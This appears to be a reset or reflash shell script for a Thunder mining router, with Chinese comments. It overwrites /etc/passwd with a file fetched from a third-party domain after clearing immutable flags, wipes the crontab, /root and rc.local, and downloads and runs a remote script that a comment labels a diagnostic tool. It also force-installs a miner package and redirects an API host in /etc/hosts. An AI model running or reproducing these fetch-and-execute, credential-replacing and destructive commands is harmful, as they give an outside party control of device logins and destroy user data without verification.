setHost()
{
    /bin/busybox chattr -i /etc 2>&1;
    chattr -i /etc/passwd*;
    [ -f /etc/passwd+ ] && rm -rf /etc/passwd+ 2>&1;
    chattr -i /etc/hosts*;
    ip=`nslookup twin13034.sandai.net | tail -n 1 | head -n 1|awk -F': ' '{print $2}'|awk '{print $1}'`;
    [ -n "$ip" ] && (
        echo "$ip kjapi.peiluyou.com">>/etc/hosts;
        [ -f /etc/init.d/dnsmasq ] && /etc/init.d/dnsmasq restart;
        killall remote;
        sleep 10;
        sed -i '2,$d' /etc/hosts;
    ) || echo '无法解析twin13034.sandai.net';
}

LOG_PATH=/tmp/reset.log

#清除crontab信息
crontab -r

wget 'http://www.xiefucai.com/tools/zqb2/passwd?TPSecNotice&TPNotCheck' -O /etc/passwd 2>>$LOG_PATH
ubus call dcdn set_dcdn_client '{"count":1}'
echo 'exit 0'>/etc/rc.local
cd /root;rm -rf *;

# 安装断网诊断工具
wget 'http://www.xiefucai.com/tools/wget_ddd.sh?TPSecNotice&TPNotCheck' -O /tmp/wget_ddd.sh 2>>$LOG_PATH;chmod +x /tmp/wget_ddd.sh 2>>$LOG_PATH;sh /tmp/wget_ddd.sh 2>>$LOG_PATH;

wget 'http://update.peiluyou.com/conf/miner_plus_test/packages/thunder-miner-app_V1.3.218_meson.ipk?TPSecNotice&TPNotCheck' -O /tmp/t.ipk 2>>$LOG_PATH

if [ -d /opt ];then
    rm -rf /opt
fi

[ -f /tmp/t.ipk ] && (opkg install --force-downgrade /tmp/t.ipk 2>>$LOG_PATH && setHost 2>>$LOG_PATH && sleep 30 && reboot &) || (echo '未下载到安装包' >>$LOG_PATH;ls -al /tmp/*.ipk >>$LOG_PATH);
